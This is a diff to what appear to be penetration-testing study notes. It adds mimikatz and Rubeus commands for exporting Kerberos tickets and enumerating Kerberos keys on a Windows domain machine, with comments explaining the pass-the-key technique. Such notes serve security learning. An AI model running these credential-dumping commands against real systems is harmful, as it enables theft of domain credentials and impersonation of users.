@@ -467,4 +467,16 @@ c:\tools> mimikatz.exe
 mimikatz # privilege::debug
 mimikatz # sekurlsa::tickets /export
 ```
-%% export all kerberos tickets if you get access to a local machine, you have to be local administrator %%
+%% export all kerberos tickets if you get access to a local machine, you have to be local administrator. The tickets that end with $ correspond to the computer account, which needs a ticket to interact with the Active Directory. User tickets have the user's name, followed by an @ that separates the service name and the domain %%
+
+```
+c:\tools> Rubeus.exe dump /nowrap
+```
+%% export all tickets using rubeus, add the nowrap for easier copy-paste and dump to dump all tickets. The ticket will be encoded in Base64 format %%
+
+```
+c:\tools> mimikatz.exe
+mimikatz # privilege::debug
+mimikatz # sekurlsa::ekeys
+```
+%% pass the key approach converts a hash/key for a domain-joined user into a full Ticket Granting Ticket (TGT), use ekeys cmd to enumerate all key types present for kerberos package %%
